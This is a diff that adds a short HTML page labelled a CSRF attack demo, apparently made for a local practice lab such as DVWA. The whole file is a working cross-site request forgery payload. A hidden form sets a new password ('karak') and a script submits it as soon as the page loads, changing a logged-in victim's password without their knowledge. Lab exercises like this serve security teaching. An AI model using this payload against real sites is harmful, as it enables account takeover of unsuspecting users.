@@ -1,0 +1,14 @@
+1 <html>
+2 <body>
+3 <h2> CSRF attack demo </h2>
+4 <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+5 <input type="hidden" name="password_new" value="karak">
+6 <input type="hidden" name="password_conf" value="karak">
+7 <input type="hidden" name="Change" value="Change">
+8 </form>
+9 <script>
+10 document.forms[0].submit();
+11 </script>
+12 </body>
+13 </html>
+14 
